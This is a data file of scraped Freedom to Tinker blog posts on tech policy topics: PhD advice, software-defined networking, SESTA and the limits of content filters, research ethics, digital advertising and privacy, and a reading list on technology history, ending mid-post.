"450","2018-09-04","2023-03-24","https://freedom-to-tinker.com/2018/09/04/why-phd-experiences-are-so-variable-and-what-you-can-do-about-it/","People who do PhDs seem to have either strongly positive or strongly negative experiences — for some, it’s the best time of their lives, while others regret the decision to do a PhD. Few career choices involve such a colossal time commitment, so it’s worth thinking carefully about whether a PhD is right for you, and what you can do to maximize your chances of having a good experience. Here are four suggestions. Like all career advice, your mileage may vary. 1. A PhD should be viewed as an end in itself, not a means to an end. Some people find that they are not enjoying their PhD research, but decide to stick with it, seeing it as a necessary route to research success and fulfillment. This is a trap. If you’re not enjoying your PhD research, you’re unlikely to enjoy a research career as a professor. Besides, professors spend the majority of our time on administrative and other unrewarding activities. (And if you don’t plan to be a professor, then you have even less of a reason to stick with an unfulfilling PhD.) If you feel confident that you’d be happier at some other job than in your PhD, jumping ship is probably the right decision. If possible, structure your program at the outset so that you can leave with a Master’s degree in about two years if the PhD isn’t working out. And consider deferring your PhD for a year or two after college, so that you’ll have a point of comparison for job satisfaction. 2. A PhD is a terrible financial decision. Doing a PhD incurs an enormous financial opportunity cost. If maximizing your earning potential is anywhere near the top of your life goals, you probably want to stay away from a PhD. While earning prospects vary substantially by discipline, a PhD is unlikely to improve your career earnings, regardless of area. 3. The environment matters. PhD programs can be welcoming and nurturing, or toxic and dysfunctional, or anywhere in between. The institution, department, your adviser, and your peers all make a big difference to your experience. But these differences are not reflected in academic rankings. When you’re deciding between programs, you might want to weigh factors like support structures for mental health, the incidence of harassment, location, and extra-curricular activities more strongly than rankings. It is extremely common for graduate researchers to face mental health challenges. During my own PhD, I benefited greatly from professional mental health support. 4. Manage risk. Like viral videos, acting careers, and startups, the distribution of success in research is wildly skewed. Most research papers gather dust while a few get all the credit — and the process that sorts papers involves a degree of luck and circumstance that researchers often don’t like to admit. This contributes to the high variance in PhD outcomes and experiences. Even for the eventual “winners”, the uncertainty is a source of stress. Perhaps counterintuitively, the role of luck means that you should embrace risky projects, because if a project is low-risk the upside will probably be relatively insignificant as well. How, then, to manage risk? One way is to diversify — maintain a portfolio of independent research agendas. Also, if the success of research projects is not purely meritocratic, it follows that selling your work makes a big difference. Many academics find this distasteful, but it’s simply a necessity. Still, at the end of the day, be mentally prepared for the possibility that your objectively best work languishes while a paper that you cranked out as a hack job ends up being your most highly cited. Conclusion. Many people embark on a PhD for the wrong reasons, such as their professors talking them into it. But a PhD only makes sense if you strongly value the intrinsic reward of intellectual pursuit and the chance to make an impact through research, with financial considerations being of secondary importance. This is an intensely personal decision. Even if you decide it’s right for you, you might want to leave yourself room to re-evaluate your choice. You should pick your program carefully and have a strategy in place for managing the inherent riskiness of research projects and the somewhat lonely nature of the journey. A note on terminology. I don’t use the terms grad school and PhD student. The “school” frame is utterly at odds with what PhD programs are about. Its use misleads prospective PhD applicants and does doctoral researchers a disservice. Besides, Master’s and PhD programs have little in common, so the umbrella term “grad school” is doubly unhelpful. Thanks to Ian Lundberg and Veena Rao for feedback on a draft."
"451","2018-02-12","2023-03-24","https://freedom-to-tinker.com/2018/02/12/software-defined-networking-whats-new-and-whats-new-for-tech-policy/","The Silicon Flatirons Conference on Regulating Computing and Code is taking place in Boulder. The annual conference addresses a range of issues at the intersection of technology and policy and provides an excellent look ahead to the tech policy issues on the horizon, particularly in telecommunications. I was looking forward to yesterday’s panel on “The Triumph of Software and Software-Defined Networks”, which had some good discussion on the ongoing problem surrounding security and privacy of the Internet of Things (IoT); some of the topics raised echoed points made on a Silicon Flatirons panel last year. My colleague and CITP director Ed Felten made some lucid, astute points about the implications of the “infiltration” of software into all of our devices. Unfortunately, though (despite the moderator’s best efforts!), the panel lacked any discussion of the forthcoming policy issues concerning Software-Defined Networking (SDN); I was concerned with some of the incorrect comments concerning SDN technology. Oddly, two panelists stated that Software Defined Networking has offered “nothing new”. Here’s one paper that explains some of the new concepts that came from SDN (including the origins of those ideas), and another that talks about what’s to come as machine learning and automated decision-making begin to drive more aspects of network management. Vint Cerf corrected some of this discussion, pointing out one example of a fundamentally new capability: the rise of programmable hardware. One of same panelists also said that SDN hasn’t seen any deployments in the wide-area Internet or at interconnection, a statement that has many counter-examples, including projects such as SDX (and the related multi-million dollar NSF program), Google’s Espresso and B4, and Facebook’s Edge Fabric to name just a few of the public examples. Some attendees commented that the panel could have discussed how SDN, when coupled with automated decision-making (“AI” in the parlance du jour) presents both new opportunities and challenges for policy. This post attempts to bring some of the issues at the intersection of SDN and policy to light. I address two main questions: What are the new technologies around SDN that people working in tech policy might want to know about?; What are some interesting problems at the intersection of SDN and tech policy? The first part of the post summarizes about 15 years of networking research in three paragraphs, in a form that policy and law scholars can hopefully digest; the second part of the post are some thoughts about new and interesting policy and legal questions—both opportunities and challenges—that these new technologies bring to bear. SDN: What’s New in Technology? Software-defined networking (SDN) describes a type of network design where a software program runs separately from the underlying hardware routers and switches can control how traffic is forwarded through the network. While in some sense, one might think of this concept as “nothing new” (after all, network operators have been pushing configuration to routers with Perl scripts for decades), SDN brings several new twists to the table: The control of a collection of network devices from a single software program, written in a high-level programming language. The notion that many devices can be controlled from a single “controller” creates the ability for coordinated decisions across the network, as opposed to the configuration of each router and switch essentially being configured (and acting) independently. When we first presented this idea for Internet routing in the mid-2000s, this was highly controversial, with some even claiming that this was “failed phone company thinking” (after all, the Internet is “decentralized”; this centralized controller nonsense could only come from the idiots working for the phone company!). Needless to say, the idea is a bit less controversial now. These ideas have taken hold both within the data center, in the wide area, and at interconnection points; technology such as the Software Defined Internet Exchange Point (SDX) makes it possible for networks to exchange traffic only for specific applications (e.g., video streaming), for example, or to route traffic for different application along different paths. The emergence of programmable hardware in network devices. Whereas conventional network devices relied on forwarding performed by fixed-function ASICs, the rise of companies such as Barefoot Networks have made it possible for network architects to customize forwarding behavior in the network. This capability is already being used for designing network architectures with new measurement and forwarding capabilities, including the ability to get detailed timing information of individual packets as they traverse each network hop, as well as to scale native multicast to millions of hosts in a data center. The rise of automated decision making in network management (“AI Meets Networking”). For years, network operators have applied machine learning to conventional network security and provisioning problems, including the automated detection of spam, botnets, phishing attacks, bullet-proof web hosting, and so forth. Operators can also use machine learning to help answer complex “what if” performance analysis questions, such as what would happen to web page load or search response time if a server was moved from one region to another, or if new network capacity was deployed. Much of this work, however, has involved developing systems that perform detection in an offline fashion (i.e., based on collected traces). Increasingly, with projects like Google Espresso and Facebook Edge Fabric, we’re starting to see systems that close the loop between measurement and control. It likely won’t be long before networks begin making these kinds of decisions based on even more complex inputs and inferences. SDN: What’s New for Tech Policy? The new capabilities that SDN offers presents a range of potentially challenging questions at the intersection of technology, policy, and law. I’ve listed a few of these interesting possibilities below: Service Level Agreements. A common contractual instrument for Internet Service Providers (ISPs) is the Service Level Agreement (SLA). SLAs typically involve guarantees about network performance: packet loss will never exceed a certain amount, latency will always be less than a certain amount, and so forth. SDN presents both new opportunities and challenges for Service Level Agreements. On the opportunity side, SDN creates the ability for operators to define much more complex traffic forwarding behavior—sending traffic along different paths according to destination, application, or even the conditions of individual links along and end-to-end path at a particular time. Yet, the opportunity to create these types of complex SLAs also presents challenges.When all routing and forwarding decisions become automated, and all interconnects look like Google Espresso, where an algorithm is effectively making decisions about where to forward traffic (perhaps based on a huge list of features ranging from application QoE to estimates of user attention, and incorporated into an inscrutable “deep learning” model), how does one go about making sure the SLA continues to be enforced?What new challenges and opportunities do the new capabilities of programmable measurement bring for SLAs? Some aspects of SLAs are notoriously difficult to enforce today. Not only will complex SLAs become easier to define, the rise of programmable measurement and advancements in network telemetry will also make SLAs easier for customers to validate. There are huge opportunities in the validation of SLAs, and once these become easier to audit, a whole new set of legal and policy questions will arise. Network Neutrality. Although the Federal Communication Commission (FCC)’s release of the Restoring Internet Freedom order earlier this year effectively rescinds many of the “bright line rules” that we have come to associate with net neutrality (i.e., no blocking, no throttling, no paid prioritization), the order actually leaves in place many transparency requirements for ISPs, requiring ISPs to disclose any practices relevant to blocking, throttling, prioritization, congestion management, application-specific behavior, and security. As with SLA definition and enforcement, network neutrality—and particularly the transparency rule—may become more interesting as SDN makes it possible for network operators to automate network decision-making, as well as for consumers to audit some of the disclosures (or lack thereof) from ISPs. SDX allows networks to make decisions about interconnection, routing, and prioritization based on specific applications, which creates new traffic management capabilities that raise interesting questions in the context of net neutrality; which of these new capabilities would constitute an exception for “reasonable network management practices”, and which might be viewed as discriminatory? Additionally, the automation of network management may make it increasingly difficult for operators to figure out what is going on (or why?), and some forwarding decisions may be more difficult to understand or explain if they are driven by a complex feature set and fully automated. Figuring out what “transparency” even means in the context of a fully automated network is a rich area for exploration at the intersection of network technology and telecommunications policy. Even things seemingly as simple as “no blocking” get complicated when networks begin automating the mitigation of attack traffic, or when content platforms begin automating takedown requests. Does every single traffic flow that is blocked by a network intrusion detection system need to be disclosed? How can ISPs best disclose the decision-making process for each blocking decision, particularly when either (1) the algorithm or set of features may be difficult to explain or understand; (2) doing so might aid those who aim to circumvent these network defenses? Virtualization: A Topic in Its Own Right. The panel moderator also asked a few times about policy and legal issues that arise as a result of virtualization. This is a fantastic question that deserves more attention. It’s worth pointing out the distinction between SDN (which separates network “control plane” software from “data plane” routers and devices) from virtualization (which involves creating virtual server and network topologies on a shared underlying physical network). In short, SDN enables virtualization, but the two are distinct technologies. Nonetheless, virtualization presents many interesting issues at the intersection of technology and policy in its own right. For one, the rise of Infrastructure as a Service (IaaS) providers such as Amazon Web Services, as well as other multi-tenant data centers, introduce questions such as how to enforce SLAs when isolation is imperfect, as well as how IaaS providers can be stewards of potentially private data that may be subject to takedown requests, subpoenas, and other actions by law enforcement and other third parties. The forthcoming Supreme Court case, Microsoft vs. United States, concerning law enforcement access to data stored abroad. Does the data actually live overseas, or this this merely a side effect of global, virtualized data centers? As virtualization is a distinct topic from SDN, the policy issues it presents warrant a separate (future) post. Summary. In summary, SDN is far from old news, and the policy questions that these new technologies bring to bear are deeply complex and deserve a careful eye from experts at the intersection of policy, law, and technology. We should start these conversations now."
"452","2018-02-05","2023-03-24","https://freedom-to-tinker.com/2018/02/05/why-everyone-in-tech-should-visit-the-american-museum-of-tort-law/","This Monday, Nikki Bourassa and I organized a van from Harvard’s Berkman Klein Center for Internet and Society to visit the American Museum of Tort Law, which I have decided to call the American Museum of Exploding Cars and Toys that Kill You. While at the museum, I came to see another way that research can inform democratic processes for public safety: through its role in court cases. I think everyone in tech should visit this museum, especially if you’re designing something that becomes part of people’s lives. The stories are organized to help you learn about US law while also thinking about what it means to responsible for the risks that a product introduces to society. You can read the full post on Medium: The American Museum of Exploding Cars and Toys That Kill You (medium.com)"
"453","2017-09-18","2023-03-24","https://freedom-to-tinker.com/2017/09/18/sesta-may-encourage-the-adoption-of-broken-automated-filtering-technologies/","The Senate is currently considering the Stop Enabling Sex Traffickers Act (SESTA, S. 1693), with a scheduled hearing tomorrow. In brief, the proposed legislation threatens to roll back aspects of Section 230 of the Communications Decency Act (CDA), which relieve content providers, or so-called “intermediaries” (e.g., Google, Facebook, Twitter) of liability for the content that is hosted on their platforms. Section 230 protects these platforms from prosecution in federal civil or state courts for the activities of their customers. One of the corollaries of SESTA is that, with increased liability, content providers might feel compelled to rely more on automated classification filters and algorithms to detect and eliminate unwanted content on the Internet. Having spent more than ten years on developing these types of classifiers to detect “unwanted traffic” ranging from spam to phishing attacks to botnets, I am deeply familiar with the potential—and limitations—of automated filtering algorithms for identifying such content. Existing algorithms can be effective for detecting and predicting certain types of “unwanted traffic”—most notably, attack traffic—but the current approaches to detecting unwanted speech fall far short of being able to reliably detect illegal speech. Content filters are inaccurate. Notably, the oft-referenced technologies for detecting illegal speech or imagery (e.g., PhotoDNA, EchoPrint), rely on matching content that is posted online against a corpus of content that is known to contain illegal content (e.g., text, audio, imagery). Unfortunately, because these technologies rely on analyzing the content of the posted material. the potential for false positives (i.e., mistakenly identifying innocuous content as illegal) and false negatives (i.e., failing to detect illegal content entirely) are both possible. The network security community has been through this scenario before, in the context of spam filtering: years ago, spam filters would analyze the text of messages to determine whether a particular message was legitimate or spam; it wasn’t long before spammers developed tens of thousands of ways to spell “Rolex” and “Viagra” to evade these filters. They also came up with other creative ways to evade them, by stuffing messages with Shakespeare, and delivering their messages through a variety of formats, ranging from compressed audio to images to spreadsheets. In short, content-based filters have largely failed to keep up with the agility of spammers. Evaluation of EchoPrint, for example, suggests that false positive rates are far too high to be used in an automated filtering context. Depending on the length of the file and the type of encoding, error rates are around 1–2 %, where an error could either be a false negative or a false positive. On the other hand, when we were working on spam filters, our discussions with online email service providers suggested that any spam filtering algorithm whose false positive rate exceeded 0.01% would be far too high to avoid raising free speech questions and concerns. In other words, some of the existing automated fingerprinting services that providers might rely on as a result of SESTA might have false positive rates that are many orders of magnitude greater than might otherwise be considered acceptable. We have written extensively about the limitations of these automated filters in the context of copyright. Content filters cannot identify context. Similarly, today, users who post content online have many tools at their disposal to evade the relatively brittle content-based filters. Detecting unwanted or illegal content on intermediary platforms is even more challenging. Instead of simply classifying unwanted email traffic such as spam (which are typically readily apparent, as they have links to advertisers, phishing sites, and so forth), the challenge on intermediary platforms entails detecting copyright, hate speech, terrorist speech, sex trafficking, and so forth. Yet, simply detecting the presence of something that matches content in a database cannot evaluate considerations fair use, parody, or coercion. Relying on automated content filters will not only produce mistakes in classifying content, but also these filters have no hope of classifying context. A possible step forward: Classifiers based on network traffic and sending pattens. About ten years ago, we realized the failure of content filters and began exploring how network traffic patterns might produce a stronger signal for illicit activity. We observed that while it was fairly easy for a spammer to change the content of a message it was potentially much more costly for a spammer to change sending patterns, such as email volumes and where messages were originating from and going to. We devised classifiers for email traffic that relied on “network-level features” that now form the basis of many online spam filters. I think there are several grand challenges that lie ahead in determining whether similar approaches could be used to identify unwanted or illegal posts on intermediary content platforms. For example, it might be the case that certain types of illegal speech are characterized by high volumes of re-tweets, short reply times, many instances of repeated messages, or some other feature that is characteristic of the traffic or the accounts that post those messages. Unfortunately, the reality is that we are far from having automated filtering technology that can reliably detect a wide range of illegal content. Determining how and whether various types of illegal content could be identified remains an open research problem. To suggest that “Any start-up has access to low cost and virtually unlimited computing power and to advanced analytics, artificial intelligence and filtering software.”—a comment that was made in a recent letter to Congress on the question of SESTA—vastly overstates the current state of the art. The bottom line is that whether we can design automated filters to detect illegal content on today’s online platforms is an open research question. A potentially unwanted side effect of SESTA is that intermediaries might feel compelled to deploy these imperfect technologies on their platforms as a result of this law, for fear of liability—thus potentially resulting in over-blocking of legal, legitimate content while failing to effectively deter or prevent the illegal speech that can easily evade today’s content-based filters. Summary: Automated filters are not “there yet”. Automated filters are often incapable of simply matching content against known offending content, typically because content-based filters are so easily evaded. An interesting question concerns whether other “signals”, such as network traffic and posting patterns, or other characteristics of user accounts (e.g., age of account, number and characteristics of followers) might help us identify illegal content of various types. But, much research is needed before we can comfortably say that these algorithms are even remotely effective at curbing illegal speech. And, even as we work to improve the effectiveness of these automated fingerprinting and filtering technologies, they will likely at best remain an aid that intermediaries might opt to use; I cannot foresee false positive rates ever reaching zero; by no means should we require intermediaries to use these algorithms and technologies in hopes that doing so will eliminate all illegal speech. Doing so would undoubtedly also curb legal and legitimate speech, even as we work to improve them."
"454","2017-08-08","2023-03-24","https://freedom-to-tinker.com/2017/08/08/getting-serious-about-research-ethics-in-computer-science/","Digital technology mediates our public and private lives. That makes computer science a powerful discipline, but it also means that ethical considerations are essential in the development of these technologies. Not all new developments may be welcomed by users, such as a patent application by Facebook that enables the company to identify their users’ emotions through cameras on their devices. A critical approach to developing digital technologies, guided by philosophical and ethical principles, will allow interventions that improve society in meaningful ways. The Center for Information Technology Policy recently organized a conference to discuss research ethics in different computer science communities, such as machine learning, security, and Internet measurement. This blog post is the first in a series that summarizes and builds on the panel discussions at the conference. Prof. Arvind Narayanan points out that computer science sub-communities have traditionally developed their own community standards about what is considered to be ethical. See for example responsible vulnerability disclosure standards in information security, or the Menlo Report for the Internet measurement discipline. This allows norms and standards to be tailored to the needs of sub-disciplines. However, the increasing responsibilities of researchers and sub-communities, arising from the increasing power and reach of computer science, are sometimes met with confusion. There is a tendency to see ethical considerations as a “policy issue” to be dealt with by others. Prof. Melissa Lane of the University Center for Human Values points out that while ethics is rooted in understanding community standards and norms, these do not exhaust it, as some researchers in computer science and other fields can sometimes be tempted to think. Rather, the academic study of ethics provides the tools to critically reflect on these norms and challenge existing and new practices. A meaningful computer science research ethics therefore does not just translate existing norms into functional requirements, but explores how values are enabled, operationalized, or stifled through technology. A careful analysis of a particular context may even uncover new values that were previously taken for granted or not even considered to be a norm. Think, for example, of “disattendability” — the idea of going about your business without anyone tracking you or paying attention to you. We usually take this for granted in the physical world, but on the Internet, ad trackers, among others, actively violate this norm on an ongoing basis. By understanding the effects of design choices and methodologies, ethics guides technology designers to choose the most appropriate approach among the available alternatives. Ethics is known for its somewhat conflicting theories, such as consequentialism (“Ends justify the Means”) and deontology (“Act in such a way that you treat humanity […] never merely as a means to an end, but always at the same time as an end”). Prof. Susan Brison cautions against an approach that simply takes an ethical theory and applies it to a technology. She raised the question whether computer science research and data science may require new types of ethics, or evolved theories. Digital data is changing the underlying properties of information, whereby our traditional ways of thinking are being challenged in important ways. For example, micro-targeting of bespoke political messages to individuals circumvents the ability to let ‘good speech’ drown out ‘bad speech’, which is a foundational idea for the concept of freedom of speech. In my research, I’ve found that ethical guidelines can be incomplete, inaccessible, or conflicting, and existing legal statutes from previous technological eras may not be directly applicable to current technology. This has resulted in computer science communities being somewhat confused about their ethical and legal responsibilities. The upcoming posts in this series will explore some of the ethical standards in machine learning, security, algorithmic transparency, and Internet measurement. We welcome any feedback to move this discussion forward at a crucial time for the ethics of computer science. See the introduction to the conference here."
"455","2016-10-28","2023-03-24","https://freedom-to-tinker.com/2016/10/28/sign-up-now-for-the-first-workshop-on-data-and-algorithmic-transparency/","I’m excited to announce that registration for the first workshop on Data and Algorithmic Transparency is now open. The workshop will take place at NYU on Nov 19. It convenes an emerging interdisciplinary community that seeks transparency and oversight of data-driven algorithmic systems through empirical research. Despite the short notice of the workshop’s announcement (about six weeks before the submission deadline), we were pleasantly surprised by the number and quality of the submissions that we received. We ended up accepting 15 papers, more than we’d originally planned to, and still had to turn away good papers. The program includes both previously published work and original papers submitted to the workshop, and has just the kind of multidisciplinary mix we were looking for. We settled on a format that’s different from the norm but probably familiar to many of you. We have five panels, one on each of the five main themes that emerged from the papers. The panels will begin with brief presentations, with the majority of the time devoted to in-depth discussions led by one or two commenters who will have read the papers beforehand and will engage with the authors. We welcome the audience to participate; to enable productive discussion, we encourage you to read or skim the papers beforehand. The previously published papers are available to read; the original papers will be made available in a few days. I’m very grateful to everyone on our program committee for their hard work in reviewing and selecting papers. We received very positive feedback from authors on the quality of reviews of the original papers, and I was impressed by the work that the committee put in. Finally, note that the workshop will take place at NYU rather than Columbia as originally announced. We learnt some lessons on the difficulty of finding optimal venues in New York City on a limited budget. Thanks to Solon Barocas and Augustin Chaintreau for their efforts in helping us find a suitable venue! See you in three weeks, and don’t forget the related and colocated DTL and FAT-ML events."
"456","2016-10-28","2023-03-24","https://freedom-to-tinker.com/2016/10/28/the-att-deal-is-about-the-data/","Most of the mainstream media coverage of the proposed AT&T acquisition of Time Warner has missed an important risk. Much of the discussion has focused on the potential market power the combined entity would have to raise prices, limit choice or otherwise disadvantage consumers. A primary motivation for the deal, however, as readers of Freedom to Tinker well understand, is the desire to access more and deeper data about consumer behavior. The motivation to combine companies is not monopolistic control, but rather a timely effort to become a player in the lucrative, $77 billion world of targeted digital advertising, now controlled by Google and Facebook. Some media, especially those covering the FCC and FTC, have begun detailing the data privacy issues raised by the deal. Hopefully, mainstream media will soon follow suit. Here are some links: BNA: FCC Privacy Rules Could Hamper AT&T-Time Warner Data Mining Inside Sources: Mega Mergers Like AT&T-Time Warner are Becoming a Problem for Privacy Regulation Bloomberg: Privacy Rule Imperils Data Riches as AT&T Pursues Time Warner Fortune: Media Companies Want U.S. to Force AT&T-Time Warner to Share Customer Data"
"457","2016-05-18","2023-03-24","https://freedom-to-tinker.com/2016/05/18/is-tesla-motors-a-hidden-warrior-for-consumer-digital-privacy/","Amid the privacy intrusions of modern digital life, few are as ubiquitous and alarming as those perpetrated by marketers. The economics of the entire industry are built on tools that exist in shadowy corners of the Internet and lurk about while we engage with information, products and even friends online, harvesting our data everywhere our mobile phones and browsers dare to go. This digital marketing model, developed three decades ago and premised on the idea that it’s OK for third parties to gather our private data and use it in whatever way suits them, will grow into a $77 billion industry in the U.S. this year, up from $57 billion in 2014, according to Forrester Research. Storm clouds are developing around the industry, however, and there are new questions being raised about the long-term viability of surreptitious data-gathering as a sustainable business model. Two factors are typically cited: Regulators in Europe have begun, and those in the U.S. are poised to begin, reining in the most intrusive of these marketing practices; and the growth of the mobile Internet, and the related reliance on apps rather than browsers for 85% of our mobile online activity, have made it more difficult to gather user data. Then there is Tesla Motors and its advertising-averse marketing model, which does not use third-party data to raise awareness and interest in its brand, drive desire for its products or spur action by its customers. Instead, the electric carmaker relies on cultural branding, a concept popularized recently by Douglas Holt, formerly of the Harvard Business School, to do much of the marketing heavy lift that brought it to the top of the electric vehicle market. And while Tesla is not the only brand engaging digital crowd culture and shunning third-party data-gathering, its success is causing the most consternation within the ranks of intrusion marketers. Policymakers in Europe and the U.S. looking to respond to industry concerns that privacy regulation would suffocate digital brand marketing should note Tesla’s recent success in marketing its as-yet unbuilt Model 3. The vehicle, intended as a mass-market cousin to the luxury Tesla S, attracted 500,000 customers in the weeks following its unveiling this spring. Those customers each made $1,000 deposits to secure a place in line to acquire a car sometime in the coming 24 months. To achieve this marketing triumph, Tesla did not buy digital ads from online marketplaces that use third-party data to identify potential customers. It did not, in any apparent way, intrude on the privacy of its potential customers by surreptitiously gathering information about their online activities. What it did do is persuasively demonstrate that brands could achieve great success without using customer-abusive, data-gathering methods. Some additional brief background on each of the marketing models mentioned may be useful to understand the current state of play. Third-party, data-based marketing models rely on detailed information about prospective customers to target future online advertising. This marketplace concept was honed by Google in 2008 when it bought DoubleClick and combined that company’s ad-serving technology with its own knowledge of consumer online search behavior. Other big players, such as OpenX, Microsoft Ad Exchange and AOL’s Marketplace AppNexus, also rely on deep and timely information about your online activities to sell digital ads to brands. Facebook adapted that model within its captive environment. Now, Google and Facebook control 64% of the digital advertising dollars spent in the U.S. By contrast, the digital crowd model does not require response to online ads. It draws power not from the accumulation of private digital data, but rather from the authenticity of information received from trusted members of the culture-shaping digital crowd. A brand that achieves success in this way can create a powerful and democratic cultural phenomenon and have additional bragging rights as a responsible corporate citizen that does not violate customer privacy. Tesla has used that latter model, or been used by it, to build a culturally relevant brand that has enjoyed remarkable success in the auto industry, a category with substantial barriers to entry including the $44 billion carmakers spend on marketing, according to research company Schonfeld & Associates. Tesla has relied on some straightforward strategies to become relevant: 1) It has embraced organizational clarity. Tesla has communicated a clear picture of its products, their role in the marketplace, and a vision for how its products will change the world, and has done all of that in a transparent way that energized its key stakeholders, customers and employees. 2) It has unleashed its celebrity CEO. Elon Musk is not your typical business leader. His combination of articulate passion for the future and his grasp of everyday business challenges has made him an ideal spokesperson for the Tesla value proposition. 3) It has allowed the brand to be shaped by Tesla “enthusiasts,” including celebrity endorsers. The digital conversation about Tesla is highly energized, social and embracing of Tesla’s values. While there are naysayers, even those tend to be more adoring than angry. According to PR analytics software TrendKite, within the first week of its March 31 launch, Tesla’s Model 3 had more media mentions—34,000—than the rest of the electric car industry. And it doesn’t hurt when the likes of Stephen Colbert are willing to become unpaid brand advocates. 4) It has marketed with low intrusion, awareness-building techniques. The total cost of Tesla’s first year marketing campaign was estimated at about $2 million. In contrast, all other automakers spent $3.4 billion in 2015 on mobile advertising alone, according to eMarketer, a category especially reliant on data-driven targeting. What did Tesla do with its marketing budget? It paid $20,000 or so for Google AdWords and $1 million for advertisements in influential print publications. Both were designed to encourage prospective customers to visit tesla.com and willingly engage with the brand on a first-party basis. The balance was spent to manage and market, mostly via billboards, its Test Drive America campaign, itself designed to build awareness and drive visitors to tesla.com. Realistically, it is still uncertain whether Tesla can actually deliver on the boldest predictions of business observers and upend the global auto market. It will face a thicket of manufacturing, service and franchise issues on its way from producing 50,000 vehicles in 2015 to 500,000 vehicles in 2020. But there is no question its success has sent a jolt of uncertainty through the digital marketing industry. In a consumer and policy environment in which digital privacy intrusions are increasingly unacceptable and millions of consumers are installing ad and third-party blockers to protect their data, society’s willingness to allow intrusive marketing techniques is being severely strained. U.S. marketing strategists are no longer asking if additional mainline brands will abandon shadowy, intrusive digital marketing models in favor of those, like Tesla Motors’, that are more transparent and respectful of their customers. They are asking when."
"458","2016-10-27","2023-03-24","https://freedom-to-tinker.com/2016/10/27/neophilia-and-human-nature/","In the spring of 2012, I attended the memorial service for John McCarthy, a computer science founding father, at an auditorium on the Stanford campus. Among the great and good anecdotes told about this great and good guy was the mention of how McCarthy, more or less in around 1961, invented time-sharing—which, as was pointed out, is what is now called cloud computing. The attendees at the memorial service gave small rueful laughs of recognition; other incarnations of the same idea have long cropped up from the 1960s onward, among them client/server architectures of the 1990s as well as The Long Now Foundation’s Danny Hillis’s notion of computing as a utility you pull in from the wall. In 1987, when I wanted my then-boss to pay for a kind of gray-market Internet access (I had hunted down a Net route-around, as in those explicitly non-commercial days only academics and government were supposed to have Net access) he harrumphed and said, “I don’t want to pay for your hanging out online and flirting.” Even then, wasting time on screens was a known Thing. Before there were Arab Spring and Twitter, there were Fidonet and Serbia. Before there was Facebook, there were Usenet, Compuserve, Plato, DECnet, Minitel. 1960s-era FCC Commissioner Nicholas Johnson often warned about the losses to privacy when big databases would be tracking and storing information about everyone, and sharing that information with each other. He was also concerned about the losses of privacy when video would make it possible to monitor people in public places. As long as there have been electronic computation and communications, humans do what they have always done, their desires and drives are eternal. People want to communicate and flirt; businesses want to find competitive advantages; governments want to keep track of internal and external threats. Technology and its implementations may change but people do not. It’s not to say there is no such thing as innovation but in our peculiar cultural moment it seems it’s been forgotten that even in the realm of information technology, many of the same technical challenges, partial solutions, and problem areas have been around since the beginning of the discipline. Neophilia—”love of the new and novel”—can be a useful way to describe an impulse towards discovery and innovation. Novelty-seeking, in other words. But the romance with neophilia in 2016 has come to have a dark side, an implication only the newest has value and nothing interesting or relevant can ever have happened before. And not only that, neophilia’s ahistoricity posits that everything in IT is fundamentally new—when it is no such thing at all. As neophilia courses through popular and industry discourse about technology in 2016, it has come to equate with a kind of cultural amnesia. Yet we still read the Greeks and Romans to learn about tragedy, tyranny, and how great empires fall. It’s worth knowing that people who attended the first few Computers, Freedom, and Privacy conferences back in the early 1990s were already worried about the snarled-up intersection of computer and communications powers with surveillance (both corporate and governmental), privacy, intellectual property, and civil liberties, issues which remain intractably knotty in 2016. When Julian Assange came into the mediasphere, he seemed like a cypherpunk hero made real. The cypherpunks were an early-90s self-assorted bunch of crypto zealots/privacy fanatics/code warriors/anarchocapitalists—who in their very name paid homage to the cyberpunk slightly dystopian slightly-into-the-future speculative fiction of the 1980s, best known as created by writers Bruce Sterling and William Gibson. It turns out young Assange used to hang out on cypherpunk lists and thus knew how to style himself as a freedom-of-information fighter and was remarkably media-savvy. We all, as Isaac Newton said, stand on the shoulders of giants. Thus, in the spirit of everything old is new again, here’s a booklist of older titles still worth reading. “Suck: Worst-Case Scenarios in Media, Culture, Advertising and the Internet”. Edited by Joey Anuff and Ana Marie Cox, 1997. “Suck” was a pioneering super-snarky insidery website that spun out of the “Wired” media combine. Joey would go on to write the first memoir about life as a daytrader and Ana Marie has gone on to have a career as a pundit. Much of the web voice, as it came to be known in sites such as Gawker, is a knockoff of what “Suck” started (and no, nothing to do with porn). “Resisting the Virtual Life: The Culture and Politics of Information”. Edited by James Brook and Iain Boal, 1995. An anthology published by City Lights, the San Francisco literary press started by the Beat Generation’s Lawrence Ferlinghetti. Iain Boal is a British lefty labor economist; contains among other things an essay by Ellen Ullman, a former programmer best known for “Close to the Machine: technophilia and its discontents”. “Bad Attitude: The Processed World Anthology”. Edited by Chris Carlsson, 1990. “Processed World” was a San Francisco-based zine that with essays, cartoons, journalism, memoir, and humor brought deep understanding to both IT itself and how it affected the lives of people working with it. Carlsson is a very interesting figure, someone with an anarcho-situationist point of vew who has done other important indie work: creating a decades-in-the-making collaborative people’s history of San Francisco, “Shaping San Francisco”; and initiating Critical Mass, a monthly Friday-night group bicycle spin throughout the City, which went on to become a global cycling-advocacy movement. “Accidental Empires”. Robert Cringely, 1992. Written by a gossip columnist (yes, a gossip columnist) for “Infoworld”, a computer-industry trade weekly, this was a breezy, readable, acerbic take on the rise of the personal computer industry and the not-necessarily-admirable personalities involved. It was later made into a three-part joint PBS/UK Channel Four documentary, “Triumph of the Nerds”. Reading this, you get a clear picture of how much luck and not necessarily merit or good character shaped the coming of the personal computer, and it includes discussions of some industry pioneers now forgotten because they weren’t among the business winners. Lots in here about Gates and Jobs and nothing about the Internet—because at the time, networking was mostly considered an afterthought of black magic and plumbing. “The Soul of a New Machine”. Tracy Kidder, 1981. This depiction of IT employees as on a heroes’ journey is about a Boston-area minicomputer company’s efforts to bring its newer, zippier machine to market. The bestseller was the very first tech-company hagiography. Kidder had the gift for making technical challenges fascinating as examples of human striving. For better or worse, he also unwittingly created the entire genre of engineering-progress books/company-struggle books, which frame themselves as documenting struggles as important and worthwhile as writing the U.S. Constitution, discovering penicillin, or creating the first transatlantic cable. “The New New Thing: A Silicon Valley Story”. Michael Lewis, 1999. Written by the modern master of explaining and debunking finance (“The Big Short” and “Flash Boys”, most recently), this book might be described as “Lewis moved to California and fell into the Silicon Valley reality-distortion field”. He understood that by the mid-1990s the art of the deal, rather than the solidity of the technology, was driving the Valley. Lewis was far less critical about his subject matter than he has always been about the machinations of Wall Street. “Fair Use: The Story of the Letter U and the Numeral 2”. Negativland, 1995. “Negativland” was an ensemble of culture-jamming radio-hacking sonic outlaws who played around with pastiche, satire, and what we would 